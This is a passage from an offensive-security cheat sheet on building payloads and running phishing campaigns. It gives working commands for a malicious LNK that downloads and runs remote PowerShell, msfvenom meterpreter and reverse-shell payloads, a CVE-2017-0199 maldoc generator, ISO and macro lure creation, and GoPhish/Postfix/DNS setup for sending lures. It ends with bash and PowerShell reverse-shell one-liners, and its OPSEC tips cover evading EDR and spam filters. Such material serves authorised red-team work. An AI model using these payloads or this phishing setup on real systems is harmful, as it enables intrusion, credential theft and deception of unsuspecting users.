$Shortcut.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
$Shortcut.Arguments = "-nop -w hidden -c `"IEX((New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/p.ps1'))`""
$Shortcut.IconLocation = "shell32.dll,3"
$Shortcut.Save()
```

### ISO / IMG Mount Containers

```bash
# Build ISO containing LNK + hidden payload (bypasses Mark-of-the-Web on older Windows)
mkisofs -o payload.iso -V "Invoice" -J -r ./payload_dir/

# Modern approach: PackMyPayload
python3 PackMyPayload.py payload.exe out.iso
```

### OneNote `.one` Embedded Attachments

- Embed `.hta`, `.bat`, `.cmd`, `.vbs`, `.js`, `.ps1` in OneNote section
- Lure to "click to open" — runs attachment via shell association
- Mitigated in current Office; still effective on unpatched / pre-2023 builds

### Macro-enabled Documents

```bash
# Generate VBA macro
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ATTACKER_IP> LPORT=443 -f vba -o macro.vba

# Tools for delivery doc creation:
# - macro_pack:    macro_pack -f payload.vba -o -G out.docm
# - EvilClippy:    EvilClippy -s decoy.vba -t 2010 lure.doc
# - msfvenom -f vba-exe : combined VBA+EXE for older Office
```

### RTF / DOCX OLE2Link Maldoc (CVE-2017-0199 / CVE-2017-8570)

OLE2Link auto-fetches a remote HTA on document open — executes outside the macro warning prompt on unpatched Office (pre-2018). Variant CVE-2017-8570 covers DOCX template-injection and remote `.sct` scriptlets.

```bash
# https://github.com/bhdresh/CVE-2017-0199
# Generate malicious RTF that fetches HTA on open (CVE-2017-0199)
python cve-2017-0199_toolkit.py -M gen -t RTF -w lure.rtf -u http://<ATTACKER_IP>:<ATTACKER_PORT>/payload.hta

# Generate HTA payload to be fetched
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<ATTACKER_PORT> -f hta-psh -o payload.hta

# Variant — DOCX template injection / SCT scriptlet (CVE-2017-8570)
python cve-2017-0199_toolkit.py -M gen -t DOC -w lure.doc -u http://<ATTACKER_IP>:<ATTACKER_PORT>/template.sct

# Host the HTA / SCT
python3 -m http.server <ATTACKER_PORT>

# Catch the callback
nc -lvnp <ATTACKER_PORT>
```

> **Tip:** OLE2Link executes the HTA via `mshta` outside the macro-warning prompt on unpatched Office. On patched/modern Office, fall back to remote-template injection (`.dotm` referenced from a DOCX `word/_rels/settings.xml.rels`).

> **OPSEC:** Raw RTF maldocs hit signature on most modern EDR. For engagement use, host HTA over HTTPS with a valid cert and stage Empire/Sliver beacons rather than raw msfvenom HTA-PSH.

### XLL / VSTO / .docm sideload

- XLL: native Excel addin, runs as DLL on open. Generated via `xllgenerator`, `Excel-XLL-Phishing` repo, or custom VS project.
- VSTO: signed managed addin; persistence via `HKCU\Software\Microsoft\Office\<OFFICE_APP>\Addins`.

### Phishing Campaign Infrastructure (GoPhish + SMTP Relay + Payload Server)

End-to-end campaign ops layer: tracker (GoPhish), authenticated outbound mail (Postfix + SPF/DKIM/DMARC), HTTPS payload host. Payload-content generation lives in the sections above; this is the delivery infrastructure.

```bash
# GoPhish — campaign management, templates, landing pages, click/open tracking
# Source: https://github.com/gophish/gophish (releases → linux-64bit.zip)
# On Kali: download latest release from the GitHub releases page
wget https://github.com/gophish/gophish/releases/latest/download/gophish-v0.12.1-linux-64bit.zip
unzip gophish-*.zip && cd gophish
# Edit config.json: bind admin to 127.0.0.1:3333, phish_server to 0.0.0.0:80 (or 443 with cert)
./gophish
# First-run admin password printed to stdout
# Browse https://127.0.0.1:3333 — configure Sending Profile, Email Template, Landing Page, Users & Groups, Campaign
```

```bash
# Postfix relay on attacker VPS — full control over headers / from-address / DKIM
apt install -y postfix mailutils opendkim opendkim-tools
# /etc/postfix/main.cf:
#   myhostname = mail.<DOMAIN>
#   inet_interfaces = all
#   smtpd_milters = inet:127.0.0.1:8891
#   non_smtpd_milters = inet:127.0.0.1:8891
systemctl restart postfix
```

```text
# DNS records on attacker domain (publish at registrar)
<DOMAIN>.            IN  A    <ATTACKER_IP>
mail.<DOMAIN>.       IN  A    <ATTACKER_IP>
<DOMAIN>.            IN  MX   10 mail.<DOMAIN>.
<DOMAIN>.            IN  TXT  "v=spf1 ip4:<ATTACKER_IP> ~all"
default._domainkey.<DOMAIN>. IN TXT "v=DKIM1; k=rsa; p=<DKIM_PUBKEY>"
_dmarc.<DOMAIN>.     IN  TXT  "v=DMARC1; p=none; rua=mailto:postmaster@<DOMAIN>"
```

```bash
# SMTP delivery test — confirm mail leaves and lands in inbox (not spam)
swaks --to <USER>@<DOMAIN> --from "sender@<ATTACKER_DOMAIN>" \
  --header "Subject: <SUBJECT>" --body "<BODY>" \
  --attach @lure.docm --server <ATTACKER_IP>:25
```

```bash
# Payload web server — HTTPS via Let's Encrypt (Office/SmartScreen flag plain HTTP)
certbot certonly --standalone -d payload.<ATTACKER_DOMAIN>
python3 -c "import http.server, ssl; s=http.server.HTTPServer(('0.0.0.0',443), http.server.SimpleHTTPRequestHandler); ctx=ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER); ctx.load_cert_chain('/etc/letsencrypt/live/payload.<ATTACKER_DOMAIN>/fullchain.pem','/etc/letsencrypt/live/payload.<ATTACKER_DOMAIN>/privkey.pem'); s.socket=ctx.wrap_socket(s.socket, server_side=True); s.serve_forever()"
```

> **Tip:** Categorize the attacker domain ahead of campaign — uncategorized domains land in spam. Aged domains via expireddomains.net; submit to bluecoat/symantec for category review.

> **OPSEC:** Stand up infra ≥1 week pre-engagement. Mid-engagement domain spin-up flags reputation filters. Warm the IP with low-volume legitimate-looking mail before campaign send.

> **RoE:** Phishing infra is tier-2 engagement work — confirm scope authorizes email delivery to in-scope users on in-scope domains before sending.

[^ top](#shells-and-payloads-methodology)

---

## Quick Reference Cheatsheet

```bash
# Most common payload (Windows x64 HTTPS)
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ATTACKER_IP> LPORT=443 -f exe -o p.exe

# Most common Linux
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f elf -o p.elf

# Most common LOTL Linux rev shell
bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'

# Most common LOTL Windows rev shell
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('<ATTACKER_IP>',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'> ';$sbb=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbb,0,$sbb.Length);$s.Flush()};$c.Close()"

# Universal listener
pwncat-cs -lp 4444

# TTY upgrade trinity
python3 -c 'import pty;pty.spawn("/bin/bash")'; ^Z; stty raw -echo; fg; export TERM=xterm-256color
```

[^ top](#shells-and-payloads-methodology)
